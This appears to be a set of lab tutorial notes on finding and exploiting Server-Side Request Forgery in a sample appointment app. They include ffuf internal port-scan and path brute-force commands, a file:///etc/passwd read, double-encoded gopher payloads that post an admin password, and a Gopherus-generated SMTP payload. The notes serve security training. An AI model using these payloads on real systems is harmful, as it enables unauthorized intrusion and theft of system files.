### **Identifying SSRF**

#### **Confirming SSRF**

1. **SSRF Overview**:  
   SSRF (Server-Side Request Forgery) occurs when an attacker can manipulate the server into making requests to internal resources or external systems that the server can access, bypassing network restrictions or firewalls.
   
2. **Example Web Application**:  
   A web application might let users schedule appointments, and it communicates with external or internal systems using URLs. In this case, the application takes the user’s chosen appointment date and passes it as a parameter (e.g., `dateserver`) in a POST request.  
   
3. **Analyzing the Request**:  
   In Burp Suite, capture the request that the application sends. The `dateserver` parameter contains a URL that the web server will fetch to check the availability for the appointment. This indicates that the server fetches external resources, which could be vulnerable to SSRF if manipulated.  
   Example request:
   ```
   POST /schedule_appointment HTTP/1.1
   Host: <SERVER_IP>
   Content-Type: application/x-www-form-urlencoded
   dateserver=http://<EXTERNAL_URL>/check_availability
   ```

4. **Testing SSRF**:  
   To confirm SSRF, modify the URL parameter (`dateserver`) to point to your own server, e.g., `http://<YOUR_IP>:<PORT>/test`.  
   - **Using Netcat to listen for the request**:  
     On your server, use a netcat listener (`nc -lnvp 8000`) to wait for incoming connections. If the application successfully makes the request to your server, you will see a connection from the application’s IP.
   - Example:
     ```bash
     PDOK@htb[/htb]$ nc -lnvp 8000
     listening on [any] 8000 ...
     connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
     GET /ssrf HTTP/1.1
     Host: 172.17.0.1:8000
     Accept: */*
     ```
   - This confirms that the web server is performing SSRF, as it is making a request to your system.

#### **Checking for Blind vs. Non-Blind SSRF**

1. **Non-Blind SSRF**:  
   If the web application responds with HTML content that matches the content of the internal resource or server (e.g., from `http://127.0.0.1/index.php`), it indicates that the SSRF is **non-blind**. In this case, the attacker can directly view the response from the internal system.  

   Example request to check for response:
   ```
   POST /schedule_appointment HTTP/1.1
   dateserver=http://127.0.0.1/index.php
   ```
   If the response contains the application’s HTML code or any internal data, it shows that the SSRF vulnerability is not blind and the attacker can obtain responses.

2. **Blind SSRF**:  
   If no response is returned or it’s not visible to the attacker (e.g., the response doesn't reflect the internal resource directly), it might be a **blind SSRF**, where attackers cannot see the output but can still trigger requests to internal systems.

#### **Enumerating the System via SSRF**

1. **Internal Port Scanning**:  
   SSRF vulnerabilities can be used to enumerate internal services running on the web server. The key is to observe how the application responds when it attempts to access different ports on the server.

   - If a **closed port** is requested (e.g., `http://127.0.0.1:81/`), the web application might return an error message such as `Failed to connect`.
   - If an **open port** is requested (e.g., `http://127.0.0.1:80/`), the response might be normal, or contain content indicating that the service is available.
   - This allows an attacker to map open ports and identify internal services, such as web servers, databases, or other services running on the target server.

2. **Using Fuzzing Tools for Port Scanning**:  
   To automate the process of discovering open ports, a tool like **ffuf** (Fuzzer for URLs) can be used.  
   - First, generate a wordlist of ports (e.g., using `seq 1 10000 > ports.txt` to create a list of ports from 1 to 10,000).
   - Then, send requests with `ffuf` by fuzzing the `dateserver` parameter to try different ports:
     ```bash
     ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect"
     ```

3. **Analyzing Results**:  
   In the results, you’ll see status codes and response sizes. For example:  
   - `FUZZ: 3306`: May indicate an open port (e.g., MySQL on port 3306).  
   - `FUZZ: 80`: Could indicate an open web server on port 80.
   The application might reveal several services through this SSRF-based port scanning technique. Open ports give insight into potential targets, such as databases or other internal applications.

4. **Example of Identified Open Services**:
   - **Port 3306**: Likely MySQL database.
   - **Port 80**: Web server (Apache, Nginx, etc.).
   - **Port 443**: HTTPS services.

---

### **Exploiting SSRF**

#### **Accessing Restricted Endpoints**

1. **Overview**:  
   SSRF vulnerabilities can be exploited to access restricted internal resources that are otherwise inaccessible due to network restrictions. In this case, a web application is fetching availability data from an external resource (`dateserver.htb`) via an HTTP request.

2. **The Issue**:  
   While the application attempts to fetch the data from `http://dateserver.htb`, access to this domain is restricted from outside. The attacker can bypass these restrictions via SSRF by manipulating the `dateserver` parameter.

3. **Accessing and Enumerating Internal Endpoints**:  
   Using an SSRF vulnerability, the attacker can perform directory brute-forcing to find hidden or sensitive endpoints on the internal server. This is done by sending different paths to the `dateserver` parameter.  
   For example, the attacker can use a fuzzer like **ffuf** to brute-force paths:
   ```bash
   ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
   ```

4. **Identifying Internal Endpoints**:  
   Through fuzzing, the attacker identifies an internal endpoint (`/admin.php`) that might contain sensitive data.
   - Example result:
     ```bash
     [Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
     FUZZ: admin
     [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
     FUZZ: availability
     ```
   This shows that the attacker has found a potentially sensitive page (`/admin.php`) that may contain admin data.

---

#### **Local File Inclusion (LFI) via SSRF**

1. **LFI Concept**:  
   SSRF vulnerabilities can be used to read local files from the web server’s filesystem by exploiting the `file://` URL scheme. If the web application allows SSRF, it might allow attackers to supply paths like `file:///etc/passwd` to access sensitive system files.

2. **Example**:  
   The attacker manipulates the `dateserver` parameter to include the file path of critical files, such as:
   ```bash
   file:///etc/passwd
   ```
   This allows the attacker to view the contents of the `passwd` file, which could contain valuable system information, including user credentials.

3. **File Inclusion Exploit**:  
   The attacker can use LFI to read arbitrary files on the server, including configuration files, logs, or even the web application's source code.

---

#### **The Gopher Protocol for SSRF**

1. **Limitations with HTTP**:  
   Some applications may restrict SSRF to `http://` or `https://`, making it difficult to interact with internal endpoints via POST requests. However, the **Gopher** protocol (`gopher://`) can be used to send arbitrary data to a TCP socket, overcoming this limitation.

2. **Using Gopher to Send POST Requests**:  
   In cases where the application performs a POST request (e.g., to access an internal admin page), the attacker can use the Gopher protocol to simulate HTTP POST requests.
   
   **Example**:  
   If the web application’s `/admin.php` endpoint requires a password (`adminpw`), the attacker can construct a Gopher URL like this:
   ```http
   gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
   ```

   This constructs the HTTP POST request to the `/admin.php` page to attempt a login with the password `admin`.

3. **URL Encoding for Gopher**:  
   The attacker needs to URL-encode the POST request headers and body. Special characters like spaces (`%20`) and newlines (`%0D%0A`) must be encoded.

4. **Double URL Encoding**:  
   Since the attacker is passing the Gopher URL inside the `dateserver` parameter (which is URL-encoded), the Gopher URL itself needs to be URL-encoded a second time to ensure it’s correctly processed by the server.  
   Example:
   ```bash
   POST /index.php HTTP/1.1
   Host: 172.17.0.2
   Content-Length: 265
   Content-Type: application/x-www-form-urlencoded
   
   dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
   ```

5. **Successful Exploitation**:  
   The internal web server processes the POST request and allows the attacker to authenticate or interact with the internal system, providing access to restricted data.

---

#### **Gopherus Tool for Automating Gopher Exploits**

1. **Overview of Gopherus**:  
   The **Gopherus** tool can automate the process of constructing Gopher URLs for various protocols, including MySQL, PostgreSQL, Redis, and SMTP. This tool simplifies the exploitation of SSRF vulnerabilities by creating valid Gopher URLs for different services.

2. **Using Gopherus**:
   The tool requires a Python2 installation. Once set up, the attacker can use the tool to generate valid Gopher URLs for interacting with different services.

   **Example**:  
   To exploit an SMTP server running on an internal port:
   ```bash
   python2.7 gopherus.py --exploit smtp
   ```

3. **SMTP Example**:  
   After inputting the necessary details for the email, the tool generates a Gopher URL like:
   ```bash
   gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A
   ```

4. **Advantages of Gopherus**:  
   The tool automates the creation of valid Gopher URLs, making it easier for attackers to exploit SSRF vulnerabilities against various services without manually constructing the URLs.

---

